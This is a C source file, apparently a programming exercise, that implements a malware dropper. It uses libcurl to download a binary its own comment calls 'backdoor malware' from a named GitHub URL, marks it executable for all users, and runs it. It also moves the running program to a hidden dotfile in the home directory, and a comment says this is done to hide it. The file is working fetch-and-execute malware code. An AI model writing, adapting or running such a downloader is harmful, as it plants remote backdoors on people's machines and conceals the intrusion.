#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/stat.h>


size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream){

    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;

}
void delMe(char* fileName){

    //move too /homeDir/destFile to hide
    char* homeDir = getenv("HOME");
    char destFile[1024];
   

    sprintf(destFile, "%s/%s", homeDir, ".downloader");

    if (rename(fileName, destFile) == -1){
        
		printf("cant move file to destFile\n");
        return;

	}

	if (chmod(destFile,  S_IRWXU | S_IRWXO | S_IRWXG) == -1){

        printf("chmod failed");
		return;

	}

}

int main(int argc, char** argv){

    CURL *curl;
    FILE *fs;
    CURLcode res;

    //download backdoor malware
    char const* url = "https://github.com/huyenlovemath/System-Programming/raw/master/backdoor/backdoor";
    char outfilename[FILENAME_MAX] = "downloaderMalware";

    if (curl_global_init(CURL_GLOBAL_ALL)){

		printf("Init curl lib failed\n");
		return 1;

	}

    curl = curl_easy_init();

    if (curl == NULL) {

        printf("Cant get curl handle\n");
        return 1;

    }

    if ((fs = fopen(outfilename,"wb")) == NULL){
        
        printf("fopen failed!\n");

    }

    //setup option

    curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fs);
    res = curl_easy_perform(curl);

    // cleanup 
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (chmod("downloaderMalware", S_IRWXU | S_IRWXO | S_IRWXG) == -1){

        printf("chmod failed\n");
        return 1;

    }


    fclose(fs);
    delMe(argv[0]);
    execl("./downloaderMalware", (char*)NULL);
   
    return 1;

}